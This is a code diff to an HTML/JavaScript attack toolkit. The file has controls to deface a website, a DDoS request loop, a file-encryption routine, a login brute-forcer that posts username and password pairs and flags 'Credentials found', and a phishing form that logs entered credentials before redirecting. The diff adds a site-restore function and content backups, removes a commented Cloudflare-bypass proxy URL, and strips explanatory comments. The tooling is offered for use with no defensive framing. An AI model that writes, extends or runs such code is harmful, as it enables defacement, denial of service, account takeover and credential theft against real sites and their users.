@@ -48,12 +48,16 @@
  <button onclick="backupSite()">Backup Site</button>
  <button onclick="previewDefacement()">Preview Defacement</button>
  <button onclick="defaceSite()">DEFACE SITE</button>
+ <button onclick="restoreSite()">Restore Site</button>
  
 
  <iframe id="preview-iframe" style="display:none; width:100%; height:500px;"></iframe>
  
 
  <script>
+  let originalSiteContent = null;
+ 
+
   async function backupSite() {
    let url = document.getElementById('defacement-url').value;
    if (!url) {
@@ -71,8 +75,8 @@
     if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
     }
-    const html = await response.text();
-    download("backup.html", html);
+    originalSiteContent = await response.text();
+    download("backup.html", originalSiteContent);
     console.log("Site backed up.");
     alert("Site backed up successfully!");
    } catch (error) {
@@ -172,6 +176,26 @@
     alert("Deface failed. Check console for details.");
    }
   }
+ 
+
+  function restoreSite() {
+   if (!originalSiteContent) {
+    console.error("No backup found.");
+    alert("No backup found. Please backup the site before restoring.");
+    return;
+   }
+ 
+
+   let newWindow = window.open('', '_blank');
+   if (newWindow) {
+    newWindow.document.write(originalSiteContent);
+    newWindow.document.close();
+    console.log("Site restored successfully in a new window.");
+    alert("Site restored successfully in a new window!");
+   } else {
+    alert('Popup blocked! Please allow popups for this site to view the restored site.');
+   }
+  }
  </script>
  
 
@@ -266,7 +290,6 @@
   async function ddosAttackThread(url, signal) {
    while (isDDoSRunning && !signal.aborted) {
     try {
-     // const proxyUrl = 'https://fuckcloudflare.tk/?' + encodeURIComponent(url);
  
 
      // Use fetch with AbortSignal
@@ -339,6 +362,10 @@
  
 
  <script>
+  let originalFileContent = null;
+  let originalFileName = null;
+ 
+
   async function encryptFile() {
    let file = document.getElementById('encryption-file').files[0];
    let key = document.getElementById('encryption-key').value;
@@ -352,9 +379,11 @@
  
 
    console.log("Encrypting file:", file.name, "with key:", key);
+   originalFileName = file.name;
    try {
     const reader = new FileReader();
     reader.onload = async function(e) {
+     originalFileContent = e.target.result; // Backup original content
      const fileContent = e.target.result;
      const encryptedContent = await encrypt(fileContent, key);
      download(file.name + ".enc", encryptedContent);
@@ -651,13 +680,9 @@
    console.log("Testing TOR connection to:", url);
  
 
-   // Implement a simple check by trying to fetch the TOR URL
    try {
     const response = await fetch(url, {
      mode: 'cors',
-     // Set up a proxy to use TOR (you might need a TOR proxy running locally)
-     // This is just an example. Actual implementation depends on your setup.
-     // Example: proxy: 'socks5://127.0.0.1:9050',
     });
  
 
@@ -714,7 +739,6 @@
       formData.append('password', password);
  
 
-      // Use 'cors' mode to avoid the No 'Access-Control-Allow-Origin' header issue
       const response = await fetch(url, {
        method: 'POST',
        body: formData,
@@ -722,13 +746,10 @@
       });
  
 
-      // Check if the response status is OK
       if (response.ok) {
-       // Parse the response body as text
        const responseText = await response.text();
  
 
-       // Check if the response body contains specific success indicators
        if (responseText.includes('Login successful') || responseText.includes('Welcome')) {
         console.log("Success! Credentials found:", username, password);
         statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
@@ -799,10 +820,8 @@
   var username = document.getElementById('username').value;
   var password = document.getElementById('password').value;
   
-  // Log the credentials (insecure, but for demonstration)
   console.log('Username:', username, 'Password:', password);
   
-  // Redirect to the specified URL
   window.location.href = '${redirectUrl}';
   });
   };
